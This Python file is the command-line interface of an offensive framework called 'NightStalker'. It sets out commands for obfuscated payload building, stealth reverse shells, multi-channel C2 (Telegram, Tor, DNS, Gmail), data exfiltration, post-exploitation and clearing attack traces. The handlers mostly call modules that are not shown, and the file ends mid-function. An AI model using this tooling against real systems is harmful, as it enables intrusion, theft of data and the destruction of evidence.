#!/usr/bin/env python3
"""
NightStalker CLI - Advanced Offensive Security Framework
Refactored: Structured command groups, detailed help, and web red team integration
"""

import argparse
import sys
import os
import logging
import json
import yaml
from pathlib import Path
from typing import Dict, List, Optional, Any
import time

# Import framework components
from .core.automation import AttackChain
from .core.reverse_shell_deployer import ReverseShellDeployer
from .c2.stealth_c2 import StealthC2
from .redteam.fuzzer import GeneticFuzzer
from .redteam.exfiltration import CovertChannels
from .redteam.infection_watchers import FileMonitor
from .redteam.self_rebuild import EnvironmentManager, EnvironmentConfig
from .redteam.payload_builder import PayloadBuilder, PayloadConfig
from .redteam.webred import WebRedTeam

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class NightStalkerCLI:
    """Main CLI interface for NightStalker framework (refactored)"""
    def __init__(self):
        self.parser = argparse.ArgumentParser(
            prog='nightstalker',
            description='NightStalker - Advanced Offensive Security Framework',
            epilog='For authorized security research and penetration testing only',
            formatter_class=argparse.RawTextHelpFormatter
        )
        self._add_global_options()
        self.subparsers = self.parser.add_subparsers(dest='group', help='Command groups')
        self._add_payload_group()
        self._add_stealth_payload_group()
        self._add_pentest_group()
        self._add_redteam_group()
        self._add_exfil_group()
        self._add_monitor_group()
        self._add_env_group()
        self._add_webred_group()
        self._add_reverse_shell_group()
        self._add_c2_group()
        self._add_help_command()

    def _add_global_options(self):
        self.parser.add_argument('--config', '-c', help='Configuration file path')
        self.parser.add_argument('--verbose', '-v', action='store_true', help='Enable verbose output')
        self.parser.add_argument('--quiet', '-q', action='store_true', help='Suppress output')
        self.parser.add_argument('--log-file', help='Log file path')

    def _add_payload_group(self):
        payload_parser = self.subparsers.add_parser('payload', help='Payload operations (build, list, clean)')
        payload_sub = payload_parser.add_subparsers(dest='payload_cmd', help='Payload subcommands')
        # Build
        build = payload_sub.add_parser('build', help='Build a payload')
        build.add_argument('--type', required=True, help='Payload type (e.g., recon, persistence, keylogger)')
        build.add_argument('--format', choices=['exe', 'dll', 'shellcode', 'python', 'bash', 'powershell'], default='python', help='Output format')
        build.add_argument('--output', '-o', help='Output file path')
        build.add_argument('--polymorph', type=int, default=0, help='Polymorphic mutation level (0-10)')
        build.add_argument('--anti-sandbox', action='store_true', help='Add anti-sandbox techniques')
        build.add_argument('--anti-debug', action='store_true', help='Add anti-debug techniques')
        build.add_argument('--encrypt', action='store_true', default=False, help='Encrypt payload')
        build.add_argument('--obfuscate', action='store_true', default=False, help='Obfuscate payload')
        # List
        payload_sub.add_parser('list', help='List available payloads')
        # Clean
        payload_sub.add_parser('clean', help='Delete all built payloads')

    def _add_stealth_payload_group(self):
        stealth_parser = self.subparsers.add_parser('stealth', help='Stealth reverse shell payload operations')
        stealth_sub = stealth_parser.add_subparsers(dest='stealth_cmd', help='Stealth payload subcommands')
        
        # Build command
        build = stealth_sub.add_parser('build', help='Build stealth reverse shell payload')
        build.add_argument('--lhost', required=True, help='C2 server IP address')
        build.add_argument('--lport', type=int, required=True, help='C2 server port')
        build.add_argument('--name', help='Custom payload filename (default: auto-generated)')
        build.add_argument('--reg-key', help='Custom registry key name (default: auto-generated)')
        build.add_argument('--encryption-key', help='Custom encryption key (default: auto-generated)')
        build.add_argument('--https', action='store_true', help='Use HTTPS communication instead of raw socket')
        build.add_argument('--url', help='C2 HTTPS URL (required if --https)')
        build.add_argument('--output', help='Output filename')
        build.add_argument('--interactive', '-i', action='store_true', help='Interactive mode for configuration')
        
        # Deploy command
        deploy = stealth_sub.add_parser('deploy', help='Deploy stealth payload to target')
        deploy.add_argument('--payload', required=True, help='Path to payload file')
        deploy.add_argument('--target', required=True, help='Target IP address or hostname')
        deploy.add_argument('--method', choices=['file', 'clipboard', 'network', 'all'], default='file', help='Deployment method')
        deploy.add_argument('--persistence', action='store_true', default=True, help='Enable persistence (default: True)')
        deploy.add_argument('--anti-detection', action='store_true', default=True, help='Enable anti-detection (default: True)')
        
        # Server command
        server = stealth_sub.add_parser('server', help='Start C2 server for stealth payload')
        server.add_argument('--host', default='0.0.0.0', help='Server host (default: 0.0.0.0)')
        server.add_argument('--port', type=int, default=4444, help='Server port (default: 4444)')
        server.add_argument('--key', help='Encryption key (must match payload)')
        server.add_argument('--daemon', action='store_true', help='Run as daemon')
        
        # Demo command
        demo = stealth_sub.add_parser('demo', help='Run complete stealth payload demonstration')
        demo.add_argument('--lhost', default='127.0.0.1', help='Demo C2 server IP (default: 127.0.0.1)')
        demo.add_argument('--lport', type=int, default=4444, help='Demo C2 server port (default: 4444)')
        demo.add_argument('--cleanup', action='store_true', help='Clean up demo files after completion')
        
        # List command
        stealth_sub.add_parser('list', help='List available stealth payload configurations')
        
        # Test command
        test = stealth_sub.add_parser('test', help='Test stealth payload functionality')
        test.add_argument('--payload', required=True, help='Path to payload file to test')
        test.add_argument('--server', action='store_true', help='Start test C2 server')
        test.add_argument('--vm-check', action='store_true', help='Test VM detection')
        test.add_argument('--persistence-check', action='store_true', help='Test persistence mechanisms')

    def _add_pentest_group(self):
        pentest_parser = self.subparsers.add_parser('pentest', help='Penetration testing campaign')
        pentest_parser.add_argument('--target', '-t', required=True, help='Target IP/CIDR or hostname')
        pentest_parser.add_argument('--chain', choices=['smb_exploit', 'web_exploit', 'full_chain'], default='full_chain', help='Attack chain to use')
        pentest_parser.add_argument('--implant', action='store_true', help='Deploy implant after exploitation')
        pentest_parser.add_argument('--c2', choices=['dns', 'https', 'icmp'], help='Command & Control channel')
        pentest_parser.add_argument('--persistence', choices=['registry', 'startup', 'service'], help='Persistence method')
        pentest_parser.add_argument('--cleanup', choices=['basic', 'forensic', 'complete'], default='basic', help='Cleanup level')
        pentest_parser.add_argument('--config-file', help='Campaign configuration file')
        pentest_parser.add_argument('--output-dir', help='Results output directory')

    def _add_redteam_group(self):
        red_parser = self.subparsers.add_parser('redteam', help='Red team operations (attack, fuzz)')
        red_sub = red_parser.add_subparsers(dest='red_cmd', help='Red team subcommands')
        # Attack
        attack = red_sub.add_parser('attack', help='Execute targeted attack')
        attack.add_argument('--target', '-t', required=True, help='Target IP address')
        attack.add_argument('--payload', choices=['memory_only', 'file_based', 'network'], default='memory_only', help='Payload type')
        attack.add_argument('--timeout', default='60m', help='Attack timeout')
        attack.add_argument('--burn-after-use', action='store_true', help='Securely delete artifacts after attack')
        attack.add_argument('--no-disk-writes', action='store_true', help='Avoid writing to disk')
        attack.add_argument('--stealth-level', type=int, choices=range(1, 11), default=8, help='Stealth level (1-10)')
        # Fuzz
        fuzz = red_sub.add_parser('fuzz', help='Run genetic fuzzing')
        fuzz.add_argument('--target', '-t', required=True, help='Target URL or endpoint')
        fuzz.add_argument('--generations', type=int, default=100, help='Number of generations')
        fuzz.add_argument('--population-size', type=int, default=50, help='Population size')
        fuzz.add_argument('--mutation-rate', type=float, default=0.3, help='Mutation rate')
        fuzz.add_argument('--wordlist', help='Custom wordlist file')
        fuzz.add_argument('--output', help='Results output file')

    def _add_exfil_group(self):
        exfil_parser = self.subparsers.add_parser('exfil', help='Data exfiltration')
        exfil_parser.add_argument('--data', '-d', required=True, help='Data file to exfiltrate')
        exfil_parser.add_argument('--channels', nargs='+', choices=['icmp', 'dns', 'https', 'smtp', 'bluetooth'], default=['https', 'dns'], help='Exfiltration channels')
        exfil_parser.add_argument('--target', help='Target server for exfiltration')
        exfil_parser.add_argument('--encrypt', action='store_true', default=True, help='Encrypt exfiltrated data')
        exfil_parser.add_argument('--chunk-size', type=int, default=1024, help='Chunk size for exfiltration')

    def _add_monitor_group(self):
        monitor_parser = self.subparsers.add_parser('monitor', help='File system monitoring')
        monitor_parser.add_argument('--paths', nargs='+', help='Paths to monitor')
        monitor_parser.add_argument('--triggers', help='Trigger configuration file')
        monitor_parser.add_argument('--payload', help='Payload to execute on trigger')
        monitor_parser.add_argument('--daemon', action='store_true', help='Run as daemon')
        monitor_parser.add_argument('--log-events', help='Event log file')

    def _add_env_group(self):
        env_parser = self.subparsers.add_parser('env', help='Environment management')
        env_parser.add_argument('--portable', action='store_true', help='Enable portable mode')
        env_parser.add_argument('--usb-path', help='USB drive path for portable mode')
        env_parser.add_argument('--burn', action='store_true', help='Enable burn-after-use mode')
        env_parser.add_argument('--mirror', help='Mirror server URL')
        env_parser.add_argument('--backup', help='Create backup')
        env_parser.add_argument('--restore', help='Restore from backup')
        env_parser.add_argument('--cleanup', action='store_true', help='Perform secure cleanup')
        env_parser.add_argument('--status', action='store_true', help='Show environment status')

    def _add_webred_group(self):
        webred_parser = self.subparsers.add_parser('webred', help='Web red teaming (scan, exploit, post-exploit, clear-traces, report)')
        webred_sub = webred_parser.add_subparsers(dest='webred_cmd', help='Web red team subcommands')
        
        # Scan command
        scan = webred_sub.add_parser('scan', help='Comprehensive web reconnaissance and enumeration')
        scan.add_argument('--url', required=True, help='Target URL')
        scan.add_argument('--modules', nargs='+', default=['all'], 
                         choices=['all', 'recon', 'enum', 'vuln', 'tech', 'dir', 'subdomain'],
                         help='Scan modules to run')
        scan.add_argument('--output', help='Output file for scan results')
        
        # Exploit command
        exploit = webred_sub.add_parser('exploit', help='Execute web exploits with post-exploitation')
        exploit.add_argument('--url', required=True, help='Target URL')
        exploit.add_argument('--exploit', required=True, 
                           choices=['sqlmap', 'xss', 'lfi', 'rfi', 'upload'],
                           help='Exploit type to execute')
        exploit.add_argument('--payload', help='Custom payload for exploitation')
        exploit.add_argument('--post-exploit', action='store_true', help='Run post-exploitation after successful exploit')
        
        # Post-exploitation command
        post_exploit = webred_sub.add_parser('post-exploit', help='Post-exploitation activities')
        post_exploit.add_argument('--target-info', required=True, help='Target information file from previous scan/exploit')
        post_exploit.add_argument('--gain-root', action='store_true', help='Attempt to gain root access')
        post_exploit.add_argument('--exfil-data', action='store_true', help='Exfiltrate sensitive data')
        post_exploit.add_argument('--establish-persistence', action='store_true', help='Establish persistence mechanisms')
        
        # Clear traces command
        clear_traces = webred_sub.add_parser('clear-traces', help='Clear all traces of the attack')
        clear_traces.add_argument('--target-info', required=True, help='Target information file')
        clear_traces.add_argument('--aggressive', action='store_true', help='Aggressive trace clearing (may affect system stability)')
        clear_traces.add_argument('--backup-logs', help='Backup logs before clearing (optional)')
        
        # Report command
        report = webred_sub.add_parser('report', help='Generate comprehensive web red team report')
        report.add_argument('--input', required=True, help='Input scan/exploit results file')
        report.add_argument('--output', required=True, help='Output report file (HTML format)')
        report.add_argument('--include-traces', action='store_true', help='Include trace clearing activities in report')

    def _add_reverse_shell_group(self):
        reverse_shell_parser = self.subparsers.add_parser('reverse-shell', help='Reverse shell deployment (deploy, list)')
        reverse_shell_sub = reverse_shell_parser.add_subparsers(dest='reverse_shell_cmd', help='Reverse shell subcommands')
        
        # Deploy command
        deploy = reverse_shell_sub.add_parser('deploy', help='Deploy reverse shell with interactive prompts')
        deploy.add_argument('--type', choices=['nc', 'msfvenom', 'python', 'bash', 'powershell'], 
                           help='Payload type (will prompt if not specified)')
        deploy.add_argument('--target-ip', help='Target IP address (will prompt if not specified)')
        deploy.add_argument('--port', type=int, help='Port number (will prompt if not specified)')
        deploy.add_argument('--no-obfuscation', action='store_true', help='Disable obfuscation (enabled by default)')
        deploy.add_argument('--method', choices=['1', '2', '3', '4'], 
                           help='Deployment method: 1=file, 2=clipboard, 3=listener, 4=all')
        
        # List command
        reverse_shell_sub.add_parser('list', help='List available reverse shell payload types')

    def _add_c2_group(self):
        c2_parser = self.subparsers.add_parser('c2', help='Command & Control (C2) operations')
        c2_sub = c2_parser.add_subparsers(dest='c2_cmd', help='C2 subcommands')
        
        # Deploy command
        deploy = c2_sub.add_parser('deploy', help='Deploy a stealth C2 server')
        deploy.add_argument('--type', choices=['http', 'https', 'dns', 'icmp'], required=True, help='C2 server type')
        deploy.add_argument('--port', type=int, required=True, help='Port for the C2 server')
        deploy.add_argument('--ssl-cert', help='Path to SSL certificate (for https)')
        deploy.add_argument('--ssl-key', help='Path to SSL key (for https)')
        deploy.add_argument('--dns-domain', help='Domain name for DNS C2 (e.g., c2.example.com)')
        deploy.add_argument('--icmp-target', help='IP address to send ICMP requests to (for ICMP C2)')
        deploy.add_argument('--no-ssl', action='store_true', help='Disable SSL for C2 server')
        deploy.add_argument('--no-dns', action='store_true', help='Disable DNS for C2 server')
        deploy.add_argument('--no-icmp', action='store_true', help='Disable ICMP for C2 server')
        
        # List command
        c2_sub.add_parser('list', help='List deployed C2 servers')
        
        # Targets command
        targets = c2_sub.add_parser('targets', help='List registered targets')
        targets.add_argument('--target-id', help='Show details for specific target')
        
        # Send command
        send = c2_sub.add_parser('send', help='Send command to target')
        send.add_argument('--target-id', required=True, help='Target ID')
        send.add_argument('--command', required=True, help='Command to execute')
        send.add_argument('--timeout', type=int, default=300, help='Command timeout in seconds')
        
        # Results command
        results = c2_sub.add_parser('results', help='Get command results')
        results.add_argument('--target-id', required=True, help='Target ID')
        results.add_argument('--command-id', help='Specific command ID')

    def _add_help_command(self):
        self.subparsers.add_parser('help', help='Show detailed help for all commands')

    def run(self, args: Optional[List[str]] = None) -> int:
        if args is None:
            args = sys.argv[1:]
        
        # Handle help command
        if not args or args[0] == 'help' or '--help' in args or '-h' in args:
            self.print_detailed_help()
            return 0
        
        try:
            parsed_args = self.parser.parse_args(args)
            group = parsed_args.group
            
            if group == 'payload':
                return self._handle_payload(parsed_args)
            elif group == 'stealth':
                return self._handle_stealth(parsed_args)
            elif group == 'pentest':
                return self._handle_pentest(parsed_args)
            elif group == 'redteam':
                return self._handle_redteam(parsed_args)
            elif group == 'exfil':
                return self._handle_exfil(parsed_args)
            elif group == 'monitor':
                return self._handle_monitor(parsed_args)
            elif group == 'env':
                return self._handle_env(parsed_args)
            elif group == 'webred':
                return self._handle_webred(parsed_args)
            elif group == 'reverse-shell':
                return self._handle_reverse_shell(parsed_args)
            elif group == 'c2':
                return self._handle_c2(parsed_args)
            else:
                self.print_detailed_help()
                return 0
        except SystemExit:
            # argparse raised SystemExit, show help
            self.print_detailed_help()
            return 1
        except Exception as e:
            print(f"Error: {e}")
            return 1

    def print_detailed_help(self):
        print("""
NightStalker CLI - Advanced Offensive Security Framework

Usage:
  nightstalker <group> <subcommand> [options]

Command Groups:
  payload       Build, list, or clean payloads
  stealth       Stealth reverse shell payload operations
  pentest       Run penetration testing campaigns
  redteam       Offensive operations (attack, fuzz)
  exfil         Data exfiltration
  monitor       File system monitoring
  env           Environment management
  webred        Web red teaming (scan, exploit, report)
  reverse-shell Reverse shell deployment (deploy, list)
  c2            Command & Control (C2) operations
  help          Show this help message

Examples:
  nightstalker payload build --type recon --format python -o output/recon.py
  nightstalker payload list
  nightstalker stealth build --lhost 192.168.1.100 --lport 4444 --https --url https://c2.example.com/api
  nightstalker pentest --target 192.168.1.0/24 --chain full_chain
  nightstalker redteam attack --target 10.0.0.5 --payload memory_only
  nightstalker redteam fuzz --target http://victim.com/api
  nightstalker exfil --data secrets.txt --channels https dns
  nightstalker monitor --paths /tmp /var/log
  nightstalker env --status
  nightstalker webred scan --url https://target.com
  nightstalker webred exploit --url https://target.com --exploit sqlmap
  nightstalker webred report --input results.json --output report.html
  nightstalker reverse-shell deploy
  nightstalker reverse-shell list
  nightstalker c2 deploy --type http --port 8080
  nightstalker c2 list

For detailed help on each group or subcommand, use:
  nightstalker <group> --help
  nightstalker <group> <subcommand> --help
""")

    # Handler methods for each group (implementations omitted for brevity)
    def _handle_payload(self, args):
        # ... implement build, list, clean logic ...
        print(f"[Payload] Command: {args.payload_cmd}")
        return 0
    def _handle_stealth(self, args):
        """Handle stealth payload deployment and management commands"""
        print(f"[DEBUG] Stealth command: {args.stealth_cmd}")
        print(f"[DEBUG] All args: {args}")
        
        try:
            from .redteam.payload_builder import StealthPayloadBuilder
            import json
            
            stealth_builder = StealthPayloadBuilder()
        except ImportError as e:
            print(f"[ERROR] Failed to import StealthPayloadBuilder: {e}")
            return 1
        
        if args.stealth_cmd == 'build':
            print("[StealthPayload] Starting stealth payload build...")
            
            # Interactive setup for different channels
            print("\n🌙 NIGHTSTALKER STEALTH PAYLOAD SETUP")
            print("=" * 50)
            
            print("\n📡 Available Stealth Payload Options:")
            print("  1: Telegram Bot (Easy setup, highly stealthy)")
            print("  2: Tor Hidden Service (Maximum stealth)")
            print("  3: DNS C2 (Very stealthy)")
            print("  4: HTTPS Server (Legitimate traffic)")
            print("  5: Gmail API (Email-based)")
            
            while True:
                choice = input("\n🎯 Select payload type (1-5): ").strip()
                if choice in ['1', '2', '3', '4', '5']:
                    break
                print("❌ Invalid choice. Please select 1-5.")
            
            payload_map = {
                '1': 'telegram',
                '2': 'tor',
                '3': 'dns',
                '4': 'https',
                '5': 'gmail'
            }
            
            payload_type = payload_map[choice]
            
            # Setup channel based on type
            if payload_type == 'telegram':
                print("\n📱 Telegram Bot Setup:")
                bot_token = input("  Bot Token: ").strip()
                chat_id = input("  Chat ID: ").strip()
                
                success = stealth_builder.setup_channel('telegram', bot_token=bot_token, chat_id=chat_id)
                
            elif payload_type == 'tor':
                print("\n🌐 Tor Hidden Service Setup:")
                print("  Note: This will create a Tor hidden service")
                hidden_service_dir = input("  Hidden service directory (optional): ").strip()
                
                success = stealth_builder.setup_channel('tor', hidden_service_dir=hidden_service_dir or None)
                
            elif payload_type == 'dns':
                print("\n🔍 DNS C2 Setup:")
                domain = input("  Domain name: ").strip()
                dns_server = input("  DNS server (default: 8.8.8.8): ").strip() or "8.8.8.8"
                
                success = stealth_builder.setup_channel('dns', domain=domain, dns_server=dns_server)
                
            elif payload_type == 'https':
                print("\n🔒 HTTPS C2 Setup:")
                server_url = input("  Server URL: ").strip()
                api_key = input("  API Key: ").strip()
                
                success = stealth_builder.setup_channel('https', server_url=server_url, api_key=api_key)
                
            elif payload_type == 'gmail':
                print("\n📧 Gmail C2 Setup:")
                credentials_file = input("  Gmail credentials file: ").strip()
                user_id = input("  User ID (default: me): ").strip() or "me"
                
                success = stealth_builder.setup_channel('gmail', credentials_file=credentials_file, user_id=user_id)
            
            if success:
                print(f"\n✅ Stealth payload '{payload_type}' setup successfully!")
                print(f"🎯 Active payload: {payload_type}")
                
                # Show usage instructions
                print("\n📋 Usage Instructions:")
                print(f"  - Payload: {payload_type}")
                print("  - Use 'nightstalker stealth deploy' to deploy to target")
                print("  - Use 'nightstalker stealth server' to start C2 server")
                print("  - Use 'nightstalker stealth test' to test functionality")
                
            else:
                print(f"\n❌ Failed to setup Stealth payload '{payload_type}'")
                return 1
                
        elif args.stealth_cmd == 'deploy':
            print("[StealthPayload] Starting stealth payload deployment...")
            
            # Build options from command line arguments
            options = {}
            
            if args.payload:
                options['payload_path'] = args.payload
            if args.target:
                options['target_ip'] = args.target
            if args.method:
                options['deployment_method'] = args.method
            if args.persistence:
                options['persistence'] = True
            if args.anti_detection:
                options['anti_detection'] = True
            
            # Deploy with options (will prompt for missing values)
            results = stealth_builder.deploy(options)
            
            if results.get('success', False):
                print("[StealthPayload] Deployment completed successfully!")
                if 'filepath' in results:
                    print(f"[StealthPayload] Payload saved to: {results['filepath']}")
            else:
                print(f"[StealthPayload] Deployment failed: {results.get('error', 'Unknown error')}")
                return 1
                
        elif args.stealth_cmd == 'server':
            print("[StealthPayload] Starting C2 server...")
            
            # Build options from command line arguments
            options = {}
            
            if args.host:
                options['host'] = args.host
            if args.port:
                options['port'] = args.port
            if args.key:
                options['encryption_key'] = args.key
            if args.daemon:
                options['daemon'] = True
            
            # Start server with options (will prompt for missing values)
            results = stealth_builder.start_server(options)
            
            if results.get('success', False):
                print("[StealthPayload] C2 server started successfully!")
                print(f"[StealthPayload] Server listening on {results['host']}:{results['port']}")
                if results.get('key'):
                    print(f"[StealthPayload] Encryption key: {results['key']}")
            else:
                print(f"[StealthPayload] Failed to start C2 server: {results.get('error', 'Unknown error')}")
                return 1
                
        elif args.stealth_cmd == 'demo':
            print("[StealthPayload] Running stealth payload demonstration...")
            
            # Build options from command line arguments
            options = {}
            
            if args.lhost:
                options['lhost'] = args.lhost
            if args.lport:
                options['lport'] = args.lport
            if args.cleanup:
                options['cleanup'] = True
            
            # Run demo with options (will prompt for missing values)
            results = stealth_builder.run_demo(options)
            
            if results.get('success', False):
                print("[StealthPayload] Stealth payload demonstration completed successfully!")
                if results.get('payload_path'):
                    print(f"[StealthPayload] Payload saved to: {results['payload_path']}")
                if results.get('c2_server_url'):
                    print(f"[StealthPayload] C2 server URL: {results['c2_server_url']}")
            else:
                print(f"[StealthPayload] Stealth payload demonstration failed: {results.get('error', 'Unknown error')}")
                return 1
                
        elif args.stealth_cmd == 'list':
            stealth_builder.list_payloads()
            
        elif args.stealth_cmd == 'test':
            print("[StealthPayload] Testing stealth payload functionality...")
            
            # Build options from command line arguments
            options = {}
            
            if args.payload:
                options['payload_path'] = args.payload
            if args.server:
                options['start_server'] = True
            if args.vm_check:
                options['vm_check'] = True
            if args.persistence_check:
                options['persistence_check'] = True
            
            # Validate with options (will prompt for missing values)
            results = stealth_builder.validate_payload(options)
            
            if results.get('success', False):
                print("[StealthPayload] Stealth payload validation completed successfully!")
                if results.get('payload_path'):
                    print(f"[StealthPayload] Payload saved to: {results['payload_path']}")
                if results.get('c2_server_url'):
                    print(f"[StealthPayload] C2 server URL: {results['c2_server_url']}")
            else:
                print(f"[StealthPayload] Stealth payload validation failed: {results.get('error', 'Unknown error')}")
                return 1
        
        return 0
    def _handle_pentest(self, args):
        print(f"[Pentest] Target: {args.target}")
        return 0
    def _handle_redteam(self, args):
        print(f"[RedTeam] Command: {args.red_cmd}")
        return 0
    def _handle_exfil(self, args):
        print(f"[Exfil] Data: {args.data}")
        return 0
    def _handle_monitor(self, args):
        print(f"[Monitor] Paths: {args.paths}")
        return 0
    def _handle_env(self, args):
        print(f"[Env] Status: {args.status}")
        return 0
    def _handle_reverse_shell(self, args):
        """Handle reverse shell deployment commands"""
        deployer = ReverseShellDeployer()
        
        if args.reverse_shell_cmd == 'deploy':
            print("[ReverseShell] Starting interactive reverse shell deployment...")
            
            # Build options from command line arguments
            options = {}
            
            if args.type:
                options['payload_type'] = args.type
            if args.target_ip:
                options['target_ip'] = args.target_ip
            if args.port:
                options['port'] = args.port
            if args.no_obfuscation:
                options['obfuscation'] = False
            if args.method:
                options['deploy_method'] = args.method
            
            # Deploy with options (will prompt for missing values)
            results = deployer.deploy(options)
            
            if results.get('success', False):
                print("[ReverseShell] Deployment completed successfully!")
                if 'filepath' in results:
                    print(f"[ReverseShell] Payload saved to: {results['filepath']}")
            else:
                print(f"[ReverseShell] Deployment failed: {results.get('error', 'Unknown error')}")
                return 1
                
        elif args.reverse_shell_cmd == 'list':
            deployer.list_payloads()
            
        return 0
    def _handle_webred(self, args):
        """Handle web red teaming commands"""
        from .redteam.webred import WebRedTeam
        import json
        
        webred = WebRedTeam()
        
        if args.webred_cmd == 'scan':
            print(f"[WebRed] Starting comprehensive scan of {args.url}")
            
            # Run comprehensive scan
            scan_results = webred.scan(args.url, args.modules)
            
            # Save results if output specified
            if args.output:
                with open(args.output, 'w') as f:
                    json.dump(scan_results, f, indent=2)
                print(f"[WebRed] Scan results saved to {args.output}")
            else:
                print("[WebRed] Scan completed. Use --output to save results.")
            
            # Display summary
            print(f"[WebRed] Scan Summary:")
            print(f"  - URL: {scan_results['url']}")
            print(f"  - Modules: {', '.join(scan_results['modules'])}")
            print(f"  - Findings: {len(scan_results['findings'])} categories")
            
        elif args.webred_cmd == 'exploit':
            print(f"[WebRed] Executing {args.exploit} exploit on {args.url}")
            
            # Execute exploit
            exploit_results = webred.exploit(args.url, args.exploit, args.payload)
            
            if exploit_results.get('success', False):
                print(f"[WebRed] Exploit successful!")
                
                # Run post-exploitation if requested
                if args.post_exploit:
                    print("[WebRed] Starting post-exploitation phase...")
                    post_exploit_results = webred.post_exploitation(exploit_results)
                    exploit_results['post_exploitation'] = post_exploit_results
                    print("[WebRed] Post-exploitation completed.")
            else:
                print(f"[WebRed] Exploit failed: {exploit_results.get('error', 'Unknown error')}")
            
            # Save results
            output_file = f"webred_exploit_{args.exploit}_{int(time.time())}.json"
            with open(output_file, 'w') as f:
                json.dump(exploit_results, f, indent=2)
            print(f"[WebRed] Exploit results saved to {output_file}")
            
        elif args.webred_cmd == 'post-exploit':
            print("[WebRed] Starting post-exploitation activities...")
            
            # Load target info
            try:
                with open(args.target_info, 'r') as f:
                    target_info = json.load(f)
            except Exception as e:
                print(f"[WebRed] Error loading target info: {e}")
                return 1
            
            # Run post-exploitation
            post_exploit_results = webred.post_exploitation(target_info)
            
            # Handle specific post-exploitation activities
            if args.gain_root:
                print("[WebRed] Attempting to gain root access...")
                root_results = webred._gain_root_access(target_info)
                post_exploit_results['root_access_attempt'] = root_results
            
            if args.exfil_data:
                print("[WebRed] Exfiltrating sensitive data...")
                exfil_results = webred._data_exfiltration(target_info)
                post_exploit_results['data_exfiltration'] = exfil_results
            
            if args.establish_persistence:
                print("[WebRed] Establishing persistence mechanisms...")
                persistence_results = webred._establish_persistence(target_info)
                post_exploit_results['persistence'] = persistence_results
            
            # Save results
            output_file = f"webred_post_exploit_{int(time.time())}.json"
            with open(output_file, 'w') as f:
                json.dump(post_exploit_results, f, indent=2)
            print(f"[WebRed] Post-exploitation results saved to {output_file}")
            
        elif args.webred_cmd == 'clear-traces':
            print("[WebRed] Clearing all traces of the attack...")
            
            # Load target info
            try:
                with open(args.target_info, 'r') as f:
                    target_info = json.load(f)
            except Exception as e:
                print(f"[WebRed] Error loading target info: {e}")
                return 1
            
            # Backup logs if requested
            if args.backup_logs:
                print(f"[WebRed] Backing up logs to {args.backup_logs}...")
                # Implementation for log backup
            
            # Clear traces
            trace_clearing_results = webred.clear_traces(target_info)
            
            # Aggressive clearing if requested
            if args.aggressive:
                print("[WebRed] Performing aggressive trace clearing...")
                # Additional aggressive clearing activities
            
            # Save results
            output_file = f"webred_trace_clearing_{int(time.time())}.json"
            with open(output_file, 'w') as f:
                json.dump(trace_clearing_results, f, indent=2)
            print(f"[WebRed] Trace clearing results saved to {output_file}")
            print("[WebRed] All traces cleared successfully.")
            
        elif args.webred_cmd == 'report':
            print(f"[WebRed] Generating comprehensive report...")
            
            # Generate report
            report_path = webred.report(args.input, args.output)
            
            if report_path.startswith("Error:"):
                print(f"[WebRed] Report generation failed: {report_path}")
                return 1
            else:
                print(f"[WebRed] Comprehensive report generated: {report_path}")
                print(f"[WebRed] Open {report_path} in a web browser to view the report.")
        
        return 0

    def _handle_c2(self, args):
        """Handle C2 server deployment and management commands"""
        c2 = StealthC2()
        
        if args.c2_cmd == 'deploy':
            print("[C2] Starting stealth C2 server deployment...")
            
            # Interactive setup for different channels
            print("\n🌙 NIGHTSTALKER STEALTH C2 SETUP")
            print("=" * 50)
            
            print("\n📡 Available C2 Channels:")
            print("  1: Telegram Bot (Easy setup, highly stealthy)")
            print("  2: Tor Hidden Service (Maximum stealth)")
            print("  3: DNS C2 (Very stealthy)")
            print("  4: HTTPS Server (Legitimate traffic)")
            print("  5: Gmail API (Email-based)")
            
            while True:
                choice = input("\n🎯 Select channel type (1-5): ").strip()
                if choice in ['1', '2', '3', '4', '5']:
                    break
                print("❌ Invalid choice. Please select 1-5.")
            
            channel_map = {
                '1': 'telegram',
                '2': 'tor',
                '3': 'dns',
                '4': 'https',
                '5': 'gmail'
            }
            
            channel_type = channel_map[choice]
            
            # Setup channel based on type
            if channel_type == 'telegram':
                print("\n📱 Telegram Bot Setup:")
                bot_token = input("  Bot Token: ").strip()
                chat_id = input("  Chat ID: ").strip()
                
                success = c2.setup_channel('telegram', bot_token=bot_token, chat_id=chat_id)
                
            elif channel_type == 'tor':
                print("\n🌐 Tor Hidden Service Setup:")
                print("  Note: This will create a Tor hidden service")
                hidden_service_dir = input("  Hidden service directory (optional): ").strip()
                
                success = c2.setup_channel('tor', hidden_service_dir=hidden_service_dir or None)
                
            elif channel_type == 'dns':
                print("\n🔍 DNS C2 Setup:")
                domain = input("  Domain name: ").strip()
                dns_server = input("  DNS server (default: 8.8.8.8): ").strip() or "8.8.8.8"
                
                success = c2.setup_channel('dns', domain=domain, dns_server=dns_server)
                
            elif channel_type == 'https':
                print("\n🔒 HTTPS C2 Setup:")
                server_url = input("  Server URL: ").strip()
                api_key = input("  API Key: ").strip()
                
                success = c2.setup_channel('https', server_url=server_url, api_key=api_key)
                
            elif channel_type == 'gmail':
                print("\n📧 Gmail C2 Setup:")
                credentials_file = input("  Gmail credentials file: ").strip()
                user_id = input("  User ID (default: me): ").strip() or "me"
                
                success = c2.setup_channel('gmail', credentials_file=credentials_file, user_id=user_id)
            
            if success:
                print(f"\n✅ C2 channel '{channel_type}' setup successfully!")
                print(f"🎯 Active channel: {channel_type}")
                
                # Show usage instructions
                print("\n📋 Usage Instructions:")
                print(f"  - Channel: {channel_type}")
                print("  - Use 'nightstalker c2 targets' to list targets")
                print("  - Use 'nightstalker c2 send' to send commands")
                print("  - Use 'nightstalker c2 results' to get results")
                
            else:
                print(f"\n❌ Failed to setup C2 channel '{channel_type}'")
                return 1
                
        elif args.c2_cmd == 'list':
            print("\n📡 Active C2 Channels:")
            if c2.active_channel:
                print(f"  ✅ {c2.active_channel}: Active")
            else:
                print("  ❌ No active channels")
            
            print("\n🎯 Registered Targets:")
            targets = c2.list_targets()
            if targets:
                for target_id, target_info in targets.items():
                    print(f"  - {target_id}: {target_info['status']} (last seen: {target_info['last_seen']})")
            else:
                print("  No targets registered")
            
        elif args.c2_cmd == 'targets':
            print("\n🎯 Registered Targets:")
            targets = c2.list_targets()
            if targets:
                for target_id, target_info in targets.items():
                    print(f"  - {target_id}: {target_info['status']} (last seen: {target_info['last_seen']})")
                    if args.target_id == target_id:
                        print("    " + json.dumps(target_info, indent=4))
            else:
                print("  No targets registered")
        
